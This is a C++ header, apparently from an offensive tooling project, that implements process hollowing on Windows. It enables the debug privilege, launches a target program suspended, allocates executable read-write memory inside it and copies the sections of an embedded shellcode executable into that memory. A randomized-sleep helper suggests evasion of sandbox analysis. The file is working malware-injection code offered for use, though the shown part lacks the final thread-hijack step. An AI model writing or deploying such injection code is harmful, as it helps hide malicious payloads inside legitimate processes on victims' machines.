#ifndef PROCESS_HOLLOWING_PROCESS_HPP
#define PROCESS_HOLLOWING_PROCESS_HPP

#include "shellcode.h"
#include <ntdef.h>
#include <optional>
#include <processthreadsapi.h>
#include <random>
#include <winbase.h>
#include <winnt.h>
namespace util {

    unsigned int generate_random_sleep_duration(unsigned int min_duration, unsigned int max_duration) {
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(min_duration, max_duration);
        return dis(gen);
    }

    bool enable_debug_privilege() {
        HANDLE token;
        TOKEN_PRIVILEGES token_privileges;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
            return false;
        }
        LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &token_privileges.Privileges[0].Luid);
        token_privileges.PrivilegeCount = 1;
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(
                    token, FALSE, &token_privileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
            CloseHandle(token);
            return false;
        }
        CloseHandle(token);
        return true;
    }
}

namespace process {

    auto get_nt_header(PIMAGE_DOS_HEADER dos_header) {
        return reinterpret_cast<PIMAGE_NT_HEADERS64>(raw_bytes + dos_header->e_lfanew);
    }

    auto get_section_header(PIMAGE_DOS_HEADER dos_header) {
        return reinterpret_cast<PIMAGE_SECTION_HEADER>(raw_bytes + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
    }

    auto load_ntdll() -> std::optional<HMODULE> {
        HMODULE nt_dll = LoadLibraryA("ntdll.dll");
        if (!nt_dll) {
            return std::nullopt;
        }
        return nt_dll;
    }

    std::optional<NtQueryInformationProcess_t> get_nt_query_info_process(HMODULE nt_dll) {
        auto nt_query_info_process = reinterpret_cast<NtQueryInformationProcess_t>(GetProcAddress(nt_dll, "NtQueryInformationProcess"));
        if (!nt_query_info_process) {
            return std::nullopt;
        }
        return nt_query_info_process;
    }

    bool is_valid_nt_header(PIMAGE_NT_HEADERS nt_header) {
        return nt_header->Signature == IMAGE_NT_SIGNATURE;
    }

    auto create_suspended_process(const std::filesystem::path &exe_path) -> std::optional<PROCESS_INFORMATION> {
        auto process_info = std::make_unique<PROCESS_INFORMATION>();
        STARTUPINFO si{sizeof(si)};
        if (!CreateProcess(reinterpret_cast<LPCSTR>(exe_path.c_str()), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, process_info.get())) {
            return std::nullopt;
        }
        return *process_info;
    }

    auto allocate_memory_in_target_process(HANDLE process, SIZE_T size) -> std::optional<PVOID> {
        PVOID memory = VirtualAllocEx(process, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!memory) {
            return std::nullopt;
        }
        return memory;
    }

    auto write_process_memory(HANDLE process, PVOID dest, const void *src, SIZE_T size) {
        SIZE_T bytes_written;
        if (!WriteProcessMemory(process, dest, src, size, &bytes_written) || bytes_written != size) {
            return false;
        }
        return true;
    }

    auto write_sections(PIMAGE_SECTION_HEADER section_header, PVOID new_image_base, PIMAGE_NT_HEADERS nt_header, HANDLE process) {
        for (WORD i = 0; i < nt_header->FileHeader.NumberOfSections; ++i) {
            PVOID section_dest = reinterpret_cast<PBYTE>(new_image_base) + section_header[i].VirtualAddress;
            PVOID section_src = reinterpret_cast<PBYTE>(raw_bytes) + section_header[i].PointerToRawData;
            SIZE_T section_size = section_header[i].SizeOfRawData;
            if (!write_process_memory(process, section_dest, section_src, section_size)) {
                std::cerr << "Failed to write section " << i << " to target process" << std::endl;
            }
        }
    }
}


#endif//PROCESS_HOLLOWING_PROCESS_HPP
